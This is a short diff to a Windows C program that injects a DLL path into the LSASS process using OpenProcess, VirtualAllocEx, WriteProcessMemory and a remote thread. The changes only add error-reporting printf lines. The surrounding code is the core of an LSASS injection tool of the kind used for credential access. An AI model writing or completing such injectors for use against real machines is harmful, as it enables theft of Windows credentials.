@@ -82,15 +82,18 @@ VOID main(int argc, char* argv[]) {
 
     ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, LsassPid);
     if (!ProcessHandle) {
+        printf("Can't open process. %d\n", GetLastError());
         goto end;
     }
     
     Allocation = VirtualAllocEx(ProcessHandle, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
     if (!Allocation) {
+        printf("Can't alloc memory. %d\n", GetLastError());
         goto end;
     }
 
     if (!WriteProcessMemory(ProcessHandle, Allocation, FullPath, sizeof(FullPath), NULL)) {
+        printf("Can't write process memory. %d\n", GetLastError());
         goto end;
     }
 
@@ -99,6 +102,9 @@ VOID main(int argc, char* argv[]) {
 end:
     if (ThreadHandle) {
         CloseHandle(ThreadHandle);
+    }
+    else {
+        printf("Can't Create Remote Thread. %d\n", GetLastError());
     }
 
     if (ProcessHandle) {
